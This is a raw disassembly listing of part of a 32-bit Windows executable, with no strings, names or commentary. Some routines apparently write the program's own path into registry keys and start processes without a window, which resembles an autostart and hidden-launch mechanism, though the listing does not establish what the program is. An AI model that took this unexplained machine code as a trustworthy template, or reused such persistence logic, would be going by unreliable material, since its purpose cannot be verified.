  401780:	e8 4f 15 01 00       	call   0x412cd4
  401785:	8b 86 ac 00 00 00    	mov    0xac(%esi),%eax
  40178b:	33 db                	xor    %ebx,%ebx
  40178d:	3b c3                	cmp    %ebx,%eax
  40178f:	74 27                	je     0x4017b8
  401791:	68 b8 0b 00 00       	push   $0xbb8
  401796:	50                   	push   %eax
  401797:	ff 15 98 50 41 00    	call   *0x415098
  40179d:	8b 86 ac 00 00 00    	mov    0xac(%esi),%eax
  4017a3:	53                   	push   %ebx
  4017a4:	50                   	push   %eax
  4017a5:	ff 15 9c 50 41 00    	call   *0x41509c
  4017ab:	8b 8e ac 00 00 00    	mov    0xac(%esi),%ecx
  4017b1:	51                   	push   %ecx
  4017b2:	ff 15 a0 50 41 00    	call   *0x4150a0
  4017b8:	e8 b3 ae 00 00       	call   0x40c670
  4017bd:	39 9e b4 00 00 00    	cmp    %ebx,0xb4(%esi)
  4017c3:	0f 85 75 01 00 00    	jne    0x40193e
  4017c9:	8b 86 a8 00 00 00    	mov    0xa8(%esi),%eax
  4017cf:	83 f8 01             	cmp    $0x1,%eax
  4017d2:	0f 85 1e 01 00 00    	jne    0x4018f6
  4017d8:	b9 7f 00 00 00       	mov    $0x7f,%ecx
  4017dd:	33 c0                	xor    %eax,%eax
  4017df:	8d 7c 24 35          	lea    0x35(%esp),%edi
  4017e3:	88 5c 24 34          	mov    %bl,0x34(%esp)
  4017e7:	f3 ab                	rep stos %eax,%es:(%edi)
  4017e9:	66 ab                	stos   %ax,%es:(%edi)
  4017eb:	aa                   	stos   %al,%es:(%edi)
  4017ec:	b9 ff 01 00 00       	mov    $0x1ff,%ecx
  4017f1:	33 c0                	xor    %eax,%eax
  4017f3:	8d bc 24 35 02 00 00 	lea    0x235(%esp),%edi
  4017fa:	88 9c 24 34 02 00 00 	mov    %bl,0x234(%esp)
  401801:	f3 ab                	rep stos %eax,%es:(%edi)
  401803:	66 ab                	stos   %ax,%es:(%edi)
  401805:	53                   	push   %ebx
  401806:	8d 54 24 18          	lea    0x18(%esp),%edx
  40180a:	68 88 fb 41 00       	push   $0x41fb88
  40180f:	52                   	push   %edx
  401810:	aa                   	stos   %al,%es:(%edi)
  401811:	ff 15 3c 55 41 00    	call   *0x41553c
  401817:	8d 44 24 20          	lea    0x20(%esp),%eax
  40181b:	68 84 fb 41 00       	push   $0x41fb84
  401820:	50                   	push   %eax
  401821:	ff 15 38 55 41 00    	call   *0x415538
  401827:	8b f8                	mov    %eax,%edi
  401829:	83 c4 14             	add    $0x14,%esp
  40182c:	3b fb                	cmp    %ebx,%edi
  40182e:	0f 84 a6 00 00 00    	je     0x4018da
  401834:	57                   	push   %edi
  401835:	68 00 08 00 00       	push   $0x800
  40183a:	8d 8c 24 3c 02 00 00 	lea    0x23c(%esp),%ecx
  401841:	6a 01                	push   $0x1
  401843:	51                   	push   %ecx
  401844:	ff 15 34 55 41 00    	call   *0x415534
  40184a:	57                   	push   %edi
  40184b:	8b f0                	mov    %eax,%esi
  40184d:	ff 15 30 55 41 00    	call   *0x415530
  401853:	83 c4 14             	add    $0x14,%esp
  401856:	8d 54 24 14          	lea    0x14(%esp),%edx
  40185a:	52                   	push   %edx
  40185b:	ff 15 a8 50 41 00    	call   *0x4150a8
  401861:	8b ce                	mov    %esi,%ecx
  401863:	8d b4 24 34 02 00 00 	lea    0x234(%esp),%esi
  40186a:	8b c1                	mov    %ecx,%eax
  40186c:	8d 7c 24 34          	lea    0x34(%esp),%edi
  401870:	c1 e9 02             	shr    $0x2,%ecx
  401873:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401875:	8b c8                	mov    %eax,%ecx
  401877:	68 84 fd 41 00       	push   $0x41fd84
  40187c:	83 e1 03             	and    $0x3,%ecx
  40187f:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401881:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  401885:	e8 20 14 01 00       	call   0x412caa
  40188a:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  40188e:	8d 54 24 0c          	lea    0xc(%esp),%edx
  401892:	51                   	push   %ecx
  401893:	50                   	push   %eax
  401894:	52                   	push   %edx
  401895:	89 9c 24 48 0a 00 00 	mov    %ebx,0xa48(%esp)
  40189c:	e8 2d 14 01 00       	call   0x412cce
  4018a1:	8b 00                	mov    (%eax),%eax
  4018a3:	53                   	push   %ebx
  4018a4:	6a 40                	push   $0x40
  4018a6:	50                   	push   %eax
  4018a7:	c6 84 24 48 0a 00 00 	movb   $0x1,0xa48(%esp)
  4018ae:	01 
  4018af:	e8 14 14 01 00       	call   0x412cc8
  4018b4:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4018b8:	88 9c 24 3c 0a 00 00 	mov    %bl,0xa3c(%esp)
  4018bf:	e8 fe 13 01 00       	call   0x412cc2
  4018c4:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4018c8:	c7 84 24 3c 0a 00 00 	movl   $0xffffffff,0xa3c(%esp)
  4018cf:	ff ff ff ff 
  4018d3:	e8 ea 13 01 00       	call   0x412cc2
  4018d8:	eb 64                	jmp    0x40193e
  4018da:	53                   	push   %ebx
  4018db:	68 f0 00 00 00       	push   $0xf0
  4018e0:	68 d8 fc 41 00       	push   $0x41fcd8
  4018e5:	e8 de 13 01 00       	call   0x412cc8
  4018ea:	c7 86 a8 00 00 00 ff 	movl   $0xffffffff,0xa8(%esi)
  4018f1:	ff ff ff 
  4018f4:	eb 48                	jmp    0x40193e
  4018f6:	83 f8 ff             	cmp    $0xffffffff,%eax
  4018f9:	75 31                	jne    0x40192c
  4018fb:	39 9e a0 00 00 00    	cmp    %ebx,0xa0(%esi)
  401901:	74 1c                	je     0x40191f
  401903:	ff 15 40 55 41 00    	call   *0x415540
  401909:	99                   	cltd
  40190a:	b9 03 00 00 00       	mov    $0x3,%ecx
  40190f:	f7 f9                	idiv   %ecx
  401911:	85 d2                	test   %edx,%edx
  401913:	75 0a                	jne    0x40191f
  401915:	53                   	push   %ebx
  401916:	6a 30                	push   $0x30
  401918:	68 20 fc 41 00       	push   $0x41fc20
  40191d:	eb 1a                	jmp    0x401939
  40191f:	53                   	push   %ebx
  401920:	68 f0 00 00 00       	push   $0xf0
  401925:	68 d8 fc 41 00       	push   $0x41fcd8
  40192a:	eb 0d                	jmp    0x401939
  40192c:	83 f8 02             	cmp    $0x2,%eax
  40192f:	75 0d                	jne    0x40193e
  401931:	53                   	push   %ebx
  401932:	6a 40                	push   $0x40
  401934:	68 d8 fb 41 00       	push   $0x41fbd8
  401939:	e8 8a 13 01 00       	call   0x412cc8
  40193e:	8b 8c 24 34 0a 00 00 	mov    0xa34(%esp),%ecx
  401945:	5f                   	pop    %edi
  401946:	5e                   	pop    %esi
  401947:	5b                   	pop    %ebx
  401948:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40194f:	81 c4 34 0a 00 00    	add    $0xa34,%esp
  401955:	c3                   	ret
  401956:	90                   	nop
  401957:	90                   	nop
  401958:	90                   	nop
  401959:	90                   	nop
  40195a:	90                   	nop
  40195b:	90                   	nop
  40195c:	90                   	nop
  40195d:	90                   	nop
  40195e:	90                   	nop
  40195f:	90                   	nop
  401960:	c7 81 b4 00 00 00 01 	movl   $0x1,0xb4(%ecx)
  401967:	00 00 00 
  40196a:	e9 6b 13 01 00       	jmp    0x412cda
  40196f:	90                   	nop
  401970:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401976:	6a ff                	push   $0xffffffff
  401978:	68 d8 34 41 00       	push   $0x4134d8
  40197d:	50                   	push   %eax
  40197e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401985:	8b 44 24 10          	mov    0x10(%esp),%eax
  401989:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401990:	00 
  401991:	50                   	push   %eax
  401992:	68 06 04 00 00       	push   $0x406
  401997:	e8 4a 13 01 00       	call   0x412ce6
  40199c:	8b c8                	mov    %eax,%ecx
  40199e:	e8 3d 13 01 00       	call   0x412ce0
  4019a3:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4019a7:	c7 44 24 08 ff ff ff 	movl   $0xffffffff,0x8(%esp)
  4019ae:	ff 
  4019af:	e8 0e 13 01 00       	call   0x412cc2
  4019b4:	8b 4c 24 00          	mov    0x0(%esp),%ecx
  4019b8:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4019bf:	83 c4 0c             	add    $0xc,%esp
  4019c2:	c2 04 00             	ret    $0x4
  4019c5:	90                   	nop
  4019c6:	90                   	nop
  4019c7:	90                   	nop
  4019c8:	90                   	nop
  4019c9:	90                   	nop
  4019ca:	90                   	nop
  4019cb:	90                   	nop
  4019cc:	90                   	nop
  4019cd:	90                   	nop
  4019ce:	90                   	nop
  4019cf:	90                   	nop
  4019d0:	8b 41 20             	mov    0x20(%ecx),%eax
  4019d3:	6a 00                	push   $0x0
  4019d5:	50                   	push   %eax
  4019d6:	ff 15 64 56 41 00    	call   *0x415664
  4019dc:	c3                   	ret
  4019dd:	90                   	nop
  4019de:	90                   	nop
  4019df:	90                   	nop
  4019e0:	8b 41 20             	mov    0x20(%ecx),%eax
  4019e3:	6a 01                	push   $0x1
  4019e5:	50                   	push   %eax
  4019e6:	ff 15 64 56 41 00    	call   *0x415664
  4019ec:	c3                   	ret
  4019ed:	90                   	nop
  4019ee:	90                   	nop
  4019ef:	90                   	nop
  4019f0:	56                   	push   %esi
  4019f1:	8b f1                	mov    %ecx,%esi
  4019f3:	e8 a6 12 01 00       	call   0x412c9e
  4019f8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  4019fd:	74 09                	je     0x401a08
  4019ff:	56                   	push   %esi
  401a00:	e8 93 12 01 00       	call   0x412c98
  401a05:	83 c4 04             	add    $0x4,%esp
  401a08:	8b c6                	mov    %esi,%eax
  401a0a:	5e                   	pop    %esi
  401a0b:	c2 04 00             	ret    $0x4
  401a0e:	90                   	nop
  401a0f:	90                   	nop
  401a10:	56                   	push   %esi
  401a11:	57                   	push   %edi
  401a12:	8b 7c 24 10          	mov    0x10(%esp),%edi
  401a16:	85 ff                	test   %edi,%edi
  401a18:	74 07                	je     0x401a21
  401a1a:	68 84 fb 41 00       	push   $0x41fb84
  401a1f:	eb 05                	jmp    0x401a26
  401a21:	68 a8 fd 41 00       	push   $0x41fda8
  401a26:	68 a0 fd 41 00       	push   $0x41fda0
  401a2b:	ff 15 38 55 41 00    	call   *0x415538
  401a31:	8b f0                	mov    %eax,%esi
  401a33:	83 c4 08             	add    $0x8,%esp
  401a36:	85 f6                	test   %esi,%esi
  401a38:	74 35                	je     0x401a6f
  401a3a:	56                   	push   %esi
  401a3b:	6a 01                	push   $0x1
  401a3d:	85 ff                	test   %edi,%edi
  401a3f:	68 0c 03 00 00       	push   $0x30c
  401a44:	74 0d                	je     0x401a53
  401a46:	8b 44 24 18          	mov    0x18(%esp),%eax
  401a4a:	50                   	push   %eax
  401a4b:	ff 15 34 55 41 00    	call   *0x415534
  401a51:	eb 0b                	jmp    0x401a5e
  401a53:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  401a57:	51                   	push   %ecx
  401a58:	ff 15 44 55 41 00    	call   *0x415544
  401a5e:	83 c4 10             	add    $0x10,%esp
  401a61:	85 c0                	test   %eax,%eax
  401a63:	56                   	push   %esi
  401a64:	75 0e                	jne    0x401a74
  401a66:	ff 15 30 55 41 00    	call   *0x415530
  401a6c:	83 c4 04             	add    $0x4,%esp
  401a6f:	5f                   	pop    %edi
  401a70:	33 c0                	xor    %eax,%eax
  401a72:	5e                   	pop    %esi
  401a73:	c3                   	ret
  401a74:	ff 15 30 55 41 00    	call   *0x415530
  401a7a:	83 c4 04             	add    $0x4,%esp
  401a7d:	b8 01 00 00 00       	mov    $0x1,%eax
  401a82:	5f                   	pop    %edi
  401a83:	5e                   	pop    %esi
  401a84:	c3                   	ret
  401a85:	90                   	nop
  401a86:	90                   	nop
  401a87:	90                   	nop
  401a88:	90                   	nop
  401a89:	90                   	nop
  401a8a:	90                   	nop
  401a8b:	90                   	nop
  401a8c:	90                   	nop
  401a8d:	90                   	nop
  401a8e:	90                   	nop
  401a8f:	90                   	nop
  401a90:	83 ec 54             	sub    $0x54,%esp
  401a93:	56                   	push   %esi
  401a94:	57                   	push   %edi
  401a95:	b9 10 00 00 00       	mov    $0x10,%ecx
  401a9a:	33 c0                	xor    %eax,%eax
  401a9c:	8d 7c 24 1c          	lea    0x1c(%esp),%edi
  401aa0:	c7 44 24 18 44 00 00 	movl   $0x44,0x18(%esp)
  401aa7:	00 
  401aa8:	f3 ab                	rep stos %eax,%es:(%edi)
  401aaa:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401aae:	8d 54 24 18          	lea    0x18(%esp),%edx
  401ab2:	33 f6                	xor    %esi,%esi
  401ab4:	51                   	push   %ecx
  401ab5:	89 44 24 10          	mov    %eax,0x10(%esp)
  401ab9:	52                   	push   %edx
  401aba:	56                   	push   %esi
  401abb:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401abf:	56                   	push   %esi
  401ac0:	68 00 00 00 08       	push   $0x8000000
  401ac5:	89 44 24 28          	mov    %eax,0x28(%esp)
  401ac9:	8b 44 24 74          	mov    0x74(%esp),%eax
  401acd:	56                   	push   %esi
  401ace:	56                   	push   %esi
  401acf:	56                   	push   %esi
  401ad0:	50                   	push   %eax
  401ad1:	56                   	push   %esi
  401ad2:	89 74 24 30          	mov    %esi,0x30(%esp)
  401ad6:	c7 44 24 6c 01 00 00 	movl   $0x1,0x6c(%esp)
  401add:	00 
  401ade:	66 89 74 24 70       	mov    %si,0x70(%esp)
  401ae3:	ff 15 8c 50 41 00    	call   *0x41508c
  401ae9:	85 c0                	test   %eax,%eax
  401aeb:	74 58                	je     0x401b45
  401aed:	8b 44 24 64          	mov    0x64(%esp),%eax
  401af1:	3b c6                	cmp    %esi,%eax
  401af3:	74 31                	je     0x401b26
  401af5:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401af9:	50                   	push   %eax
  401afa:	51                   	push   %ecx
  401afb:	ff 15 98 50 41 00    	call   *0x415098
  401b01:	85 c0                	test   %eax,%eax
  401b03:	74 0d                	je     0x401b12
  401b05:	8b 54 24 08          	mov    0x8(%esp),%edx
  401b09:	6a ff                	push   $0xffffffff
  401b0b:	52                   	push   %edx
  401b0c:	ff 15 90 50 41 00    	call   *0x415090
  401b12:	8b 44 24 68          	mov    0x68(%esp),%eax
  401b16:	3b c6                	cmp    %esi,%eax
  401b18:	74 0c                	je     0x401b26
  401b1a:	50                   	push   %eax
  401b1b:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401b1f:	50                   	push   %eax
  401b20:	ff 15 94 50 41 00    	call   *0x415094
  401b26:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401b2a:	8b 35 a0 50 41 00    	mov    0x4150a0,%esi
  401b30:	51                   	push   %ecx
  401b31:	ff d6                	call   *%esi
  401b33:	8b 54 24 0c          	mov    0xc(%esp),%edx
  401b37:	52                   	push   %edx
  401b38:	ff d6                	call   *%esi
  401b3a:	5f                   	pop    %edi
  401b3b:	b8 01 00 00 00       	mov    $0x1,%eax
  401b40:	5e                   	pop    %esi
  401b41:	83 c4 54             	add    $0x54,%esp
  401b44:	c3                   	ret
  401b45:	5f                   	pop    %edi
  401b46:	33 c0                	xor    %eax,%eax
  401b48:	5e                   	pop    %esi
  401b49:	83 c4 54             	add    $0x54,%esp
  401b4c:	c3                   	ret
  401b4d:	90                   	nop
  401b4e:	90                   	nop
  401b4f:	90                   	nop
  401b50:	83 ec 3c             	sub    $0x3c,%esp
  401b53:	57                   	push   %edi
  401b54:	b9 0e 00 00 00       	mov    $0xe,%ecx
  401b59:	33 c0                	xor    %eax,%eax
  401b5b:	8d 7c 24 08          	lea    0x8(%esp),%edi
  401b5f:	f3 ab                	rep stos %eax,%es:(%edi)
  401b61:	8b 4c 24 44          	mov    0x44(%esp),%ecx
  401b65:	8b 54 24 48          	mov    0x48(%esp),%edx
  401b69:	89 44 24 08          	mov    %eax,0x8(%esp)
  401b6d:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401b71:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  401b75:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  401b79:	f7 d8                	neg    %eax
  401b7b:	1b c0                	sbb    %eax,%eax
  401b7d:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  401b81:	83 e0 05             	and    $0x5,%eax
  401b84:	51                   	push   %ecx
  401b85:	c7 44 24 08 3c 00 00 	movl   $0x3c,0x8(%esp)
  401b8c:	00 
  401b8d:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  401b91:	89 44 24 24          	mov    %eax,0x24(%esp)
  401b95:	c7 44 24 14 ac fd 41 	movl   $0x41fdac,0x14(%esp)
  401b9c:	00 
  401b9d:	ff 15 d0 55 41 00    	call   *0x4155d0
  401ba3:	48                   	dec    %eax
  401ba4:	5f                   	pop    %edi
  401ba5:	f7 d8                	neg    %eax
  401ba7:	1b c0                	sbb    %eax,%eax
  401ba9:	40                   	inc    %eax
  401baa:	83 c4 3c             	add    $0x3c,%esp
  401bad:	c3                   	ret
  401bae:	90                   	nop
  401baf:	90                   	nop
  401bb0:	83 ec 10             	sub    $0x10,%esp
  401bb3:	53                   	push   %ebx
  401bb4:	8d 44 24 08          	lea    0x8(%esp),%eax
  401bb8:	33 db                	xor    %ebx,%ebx
  401bba:	50                   	push   %eax
  401bbb:	53                   	push   %ebx
  401bbc:	53                   	push   %ebx
  401bbd:	53                   	push   %ebx
  401bbe:	53                   	push   %ebx
  401bbf:	53                   	push   %ebx
  401bc0:	53                   	push   %ebx
  401bc1:	68 20 02 00 00       	push   $0x220
  401bc6:	6a 20                	push   $0x20
  401bc8:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  401bcc:	6a 02                	push   $0x2
  401bce:	51                   	push   %ecx
  401bcf:	88 5c 24 38          	mov    %bl,0x38(%esp)
  401bd3:	88 5c 24 39          	mov    %bl,0x39(%esp)
  401bd7:	88 5c 24 3a          	mov    %bl,0x3a(%esp)
  401bdb:	88 5c 24 3b          	mov    %bl,0x3b(%esp)
  401bdf:	88 5c 24 3c          	mov    %bl,0x3c(%esp)
  401be3:	c6 44 24 3d 05       	movb   $0x5,0x3d(%esp)
  401be8:	89 5c 24 30          	mov    %ebx,0x30(%esp)
  401bec:	ff 15 18 50 41 00    	call   *0x415018
  401bf2:	85 c0                	test   %eax,%eax
  401bf4:	75 05                	jne    0x401bfb
  401bf6:	5b                   	pop    %ebx
  401bf7:	83 c4 10             	add    $0x10,%esp
  401bfa:	c3                   	ret
  401bfb:	8b 44 24 08          	mov    0x8(%esp),%eax
  401bff:	8d 54 24 04          	lea    0x4(%esp),%edx
  401c03:	52                   	push   %edx
  401c04:	50                   	push   %eax
  401c05:	53                   	push   %ebx
  401c06:	ff 15 1c 50 41 00    	call   *0x41501c
  401c0c:	85 c0                	test   %eax,%eax
  401c0e:	75 04                	jne    0x401c14
  401c10:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  401c14:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401c18:	51                   	push   %ecx
  401c19:	ff 15 20 50 41 00    	call   *0x415020
  401c1f:	8b 44 24 04          	mov    0x4(%esp),%eax
  401c23:	5b                   	pop    %ebx
  401c24:	83 c4 10             	add    $0x10,%esp
  401c27:	c3                   	ret
  401c28:	90                   	nop
  401c29:	90                   	nop
  401c2a:	90                   	nop
  401c2b:	90                   	nop
  401c2c:	90                   	nop
  401c2d:	90                   	nop
  401c2e:	90                   	nop
  401c2f:	90                   	nop
  401c30:	8b 44 24 04          	mov    0x4(%esp),%eax
  401c34:	53                   	push   %ebx
  401c35:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  401c39:	56                   	push   %esi
  401c3a:	57                   	push   %edi
  401c3b:	50                   	push   %eax
  401c3c:	c6 03 00             	movb   $0x0,(%ebx)
  401c3f:	ff 15 b0 56 41 00    	call   *0x4156b0
  401c45:	8b f8                	mov    %eax,%edi
  401c47:	83 c9 ff             	or     $0xffffffff,%ecx
  401c4a:	33 c0                	xor    %eax,%eax
  401c4c:	f2 ae                	repnz scas %es:(%edi),%al
  401c4e:	f7 d1                	not    %ecx
  401c50:	2b f9                	sub    %ecx,%edi
  401c52:	8b c3                	mov    %ebx,%eax
  401c54:	8b d1                	mov    %ecx,%edx
  401c56:	8b f7                	mov    %edi,%esi
  401c58:	8b fb                	mov    %ebx,%edi
  401c5a:	c1 e9 02             	shr    $0x2,%ecx
  401c5d:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401c5f:	8b ca                	mov    %edx,%ecx
  401c61:	83 e1 03             	and    $0x3,%ecx
  401c64:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401c66:	5f                   	pop    %edi
  401c67:	5e                   	pop    %esi
  401c68:	5b                   	pop    %ebx
  401c69:	c3                   	ret
  401c6a:	90                   	nop
  401c6b:	90                   	nop
  401c6c:	90                   	nop
  401c6d:	90                   	nop
  401c6e:	90                   	nop
  401c6f:	90                   	nop
  401c70:	81 ec d8 02 00 00    	sub    $0x2d8,%esp
  401c76:	53                   	push   %ebx
  401c77:	55                   	push   %ebp
  401c78:	56                   	push   %esi
  401c79:	57                   	push   %edi
  401c7a:	b9 05 00 00 00       	mov    $0x5,%ecx
  401c7f:	be e0 fd 41 00       	mov    $0x41fde0,%esi
  401c84:	8d 7c 24 18          	lea    0x18(%esp),%edi
  401c88:	33 c0                	xor    %eax,%eax
  401c8a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401c8c:	b9 2d 00 00 00       	mov    $0x2d,%ecx
  401c91:	8d 7c 24 2c          	lea    0x2c(%esp),%edi
  401c95:	f3 ab                	rep stos %eax,%es:(%edi)
  401c97:	b9 81 00 00 00       	mov    $0x81,%ecx
  401c9c:	8d bc 24 e1 00 00 00 	lea    0xe1(%esp),%edi
  401ca3:	88 84 24 e0 00 00 00 	mov    %al,0xe0(%esp)
  401caa:	68 c8 fd 41 00       	push   $0x41fdc8
  401caf:	f3 ab                	rep stos %eax,%es:(%edi)
  401cb1:	66 ab                	stos   %ax,%es:(%edi)
  401cb3:	aa                   	stos   %al,%es:(%edi)
  401cb4:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  401cb8:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  401cbf:	00 
  401cc0:	50                   	push   %eax
  401cc1:	ff 15 54 55 41 00    	call   *0x415554
  401cc7:	8b 2d e8 50 41 00    	mov    0x4150e8,%ebp
  401ccd:	8b 1d 0c 50 41 00    	mov    0x41500c,%ebx
  401cd3:	83 c4 08             	add    $0x8,%esp
  401cd6:	33 ff                	xor    %edi,%edi
  401cd8:	89 7c 24 14          	mov    %edi,0x14(%esp)
  401cdc:	85 ff                	test   %edi,%edi
  401cde:	75 11                	jne    0x401cf1
  401ce0:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  401ce4:	8d 54 24 18          	lea    0x18(%esp),%edx
  401ce8:	51                   	push   %ecx
  401ce9:	52                   	push   %edx
  401cea:	68 02 00 00 80       	push   $0x80000002
  401cef:	eb 0f                	jmp    0x401d00
  401cf1:	8d 44 24 10          	lea    0x10(%esp),%eax
  401cf5:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  401cf9:	50                   	push   %eax
  401cfa:	51                   	push   %ecx
  401cfb:	68 01 00 00 80       	push   $0x80000001
  401d00:	ff 15 10 50 41 00    	call   *0x415010
  401d06:	8b 44 24 10          	mov    0x10(%esp),%eax
  401d0a:	85 c0                	test   %eax,%eax
  401d0c:	0f 84 9b 00 00 00    	je     0x401dad
  401d12:	8b 8c 24 ec 02 00 00 	mov    0x2ec(%esp),%ecx
  401d19:	85 c9                	test   %ecx,%ecx
  401d1b:	74 45                	je     0x401d62
  401d1d:	8d 94 24 e0 00 00 00 	lea    0xe0(%esp),%edx
  401d24:	52                   	push   %edx
  401d25:	68 07 02 00 00       	push   $0x207
  401d2a:	ff d5                	call   *%ebp
  401d2c:	8d bc 24 e0 00 00 00 	lea    0xe0(%esp),%edi
  401d33:	83 c9 ff             	or     $0xffffffff,%ecx
  401d36:	33 c0                	xor    %eax,%eax
  401d38:	f2 ae                	repnz scas %es:(%edi),%al
  401d3a:	f7 d1                	not    %ecx
  401d3c:	8d 84 24 e0 00 00 00 	lea    0xe0(%esp),%eax
  401d43:	51                   	push   %ecx
  401d44:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  401d48:	50                   	push   %eax
  401d49:	6a 01                	push   $0x1
  401d4b:	6a 00                	push   $0x0
  401d4d:	68 c4 fd 41 00       	push   $0x41fdc4
  401d52:	51                   	push   %ecx
  401d53:	ff d3                	call   *%ebx
  401d55:	8b 7c 24 14          	mov    0x14(%esp),%edi
  401d59:	8b f0                	mov    %eax,%esi
  401d5b:	f7 de                	neg    %esi
  401d5d:	1b f6                	sbb    %esi,%esi
  401d5f:	46                   	inc    %esi
  401d60:	eb 3c                	jmp    0x401d9e
  401d62:	8d 54 24 14          	lea    0x14(%esp),%edx
  401d66:	8d 8c 24 e0 00 00 00 	lea    0xe0(%esp),%ecx
  401d6d:	52                   	push   %edx
  401d6e:	51                   	push   %ecx
  401d6f:	6a 00                	push   $0x0
  401d71:	6a 00                	push   $0x0
  401d73:	68 c4 fd 41 00       	push   $0x41fdc4
  401d78:	50                   	push   %eax
  401d79:	c7 44 24 2c 07 02 00 	movl   $0x207,0x2c(%esp)
  401d80:	00 
  401d81:	ff 15 00 50 41 00    	call   *0x415000
  401d87:	8b f0                	mov    %eax,%esi
  401d89:	f7 de                	neg    %esi
  401d8b:	1b f6                	sbb    %esi,%esi
  401d8d:	46                   	inc    %esi
  401d8e:	74 0e                	je     0x401d9e
  401d90:	8d 94 24 e0 00 00 00 	lea    0xe0(%esp),%edx
  401d97:	52                   	push   %edx
  401d98:	ff 15 e4 50 41 00    	call   *0x4150e4
  401d9e:	8b 44 24 10          	mov    0x10(%esp),%eax
  401da2:	50                   	push   %eax
  401da3:	ff 15 14 50 41 00    	call   *0x415014
  401da9:	85 f6                	test   %esi,%esi
  401dab:	75 1b                	jne    0x401dc8
  401dad:	47                   	inc    %edi
  401dae:	83 ff 02             	cmp    $0x2,%edi
  401db1:	89 7c 24 14          	mov    %edi,0x14(%esp)
  401db5:	0f 8c 21 ff ff ff    	jl     0x401cdc
  401dbb:	5f                   	pop    %edi
  401dbc:	5e                   	pop    %esi
  401dbd:	5d                   	pop    %ebp
  401dbe:	33 c0                	xor    %eax,%eax
  401dc0:	5b                   	pop    %ebx
  401dc1:	81 c4 d8 02 00 00    	add    $0x2d8,%esp
  401dc7:	c3                   	ret
  401dc8:	5f                   	pop    %edi
  401dc9:	5e                   	pop    %esi
  401dca:	5d                   	pop    %ebp
  401dcb:	b8 01 00 00 00       	mov    $0x1,%eax
  401dd0:	5b                   	pop    %ebx
  401dd1:	81 c4 d8 02 00 00    	add    $0x2d8,%esp
  401dd7:	c3                   	ret
  401dd8:	90                   	nop
  401dd9:	90                   	nop
  401dda:	90                   	nop
  401ddb:	90                   	nop
  401ddc:	90                   	nop
  401ddd:	90                   	nop
  401dde:	90                   	nop
  401ddf:	90                   	nop
  401de0:	8b 44 24 04          	mov    0x4(%esp),%eax
  401de4:	33 c9                	xor    %ecx,%ecx
  401de6:	33 d2                	xor    %edx,%edx
  401de8:	56                   	push   %esi
  401de9:	66 8b 48 0c          	mov    0xc(%eax),%cx
  401ded:	66 8b 50 0a          	mov    0xa(%eax),%dx
  401df1:	51                   	push   %ecx
  401df2:	52                   	push   %edx
  401df3:	33 c9                	xor    %ecx,%ecx
  401df5:	33 d2                	xor    %edx,%edx
  401df7:	66 8b 48 08          	mov    0x8(%eax),%cx
  401dfb:	66 8b 50 06          	mov    0x6(%eax),%dx
  401dff:	8b 74 24 14          	mov    0x14(%esp),%esi
  401e03:	51                   	push   %ecx
  401e04:	52                   	push   %edx
  401e05:	33 c9                	xor    %ecx,%ecx
  401e07:	66 8b 48 02          	mov    0x2(%eax),%cx
  401e0b:	33 d2                	xor    %edx,%edx
  401e0d:	66 8b 10             	mov    (%eax),%dx
  401e10:	51                   	push   %ecx
  401e11:	52                   	push   %edx
  401e12:	68 f4 fd 41 00       	push   $0x41fdf4
  401e17:	56                   	push   %esi
  401e18:	ff 15 3c 55 41 00    	call   *0x41553c
  401e1e:	83 c4 20             	add    $0x20,%esp
  401e21:	8b c6                	mov    %esi,%eax
  401e23:	5e                   	pop    %esi
  401e24:	c3                   	ret
  401e25:	90                   	nop
  401e26:	90                   	nop
  401e27:	90                   	nop
  401e28:	90                   	nop
  401e29:	90                   	nop
  401e2a:	90                   	nop
  401e2b:	90                   	nop
  401e2c:	90                   	nop
  401e2d:	90                   	nop
  401e2e:	90                   	nop
  401e2f:	90                   	nop
  401e30:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401e34:	83 ec 10             	sub    $0x10,%esp
  401e37:	8d 44 24 00          	lea    0x0(%esp),%eax
  401e3b:	50                   	push   %eax
  401e3c:	51                   	push   %ecx
  401e3d:	e8 1e 00 00 00       	call   0x401e60
  401e42:	8b 54 24 20          	mov    0x20(%esp),%edx
  401e46:	8d 44 24 08          	lea    0x8(%esp),%eax
  401e4a:	52                   	push   %edx
  401e4b:	50                   	push   %eax
  401e4c:	e8 8f ff ff ff       	call   0x401de0
  401e51:	83 c4 20             	add    $0x20,%esp
  401e54:	c3                   	ret
  401e55:	90                   	nop
  401e56:	90                   	nop
  401e57:	90                   	nop
  401e58:	90                   	nop
  401e59:	90                   	nop
  401e5a:	90                   	nop
  401e5b:	90                   	nop
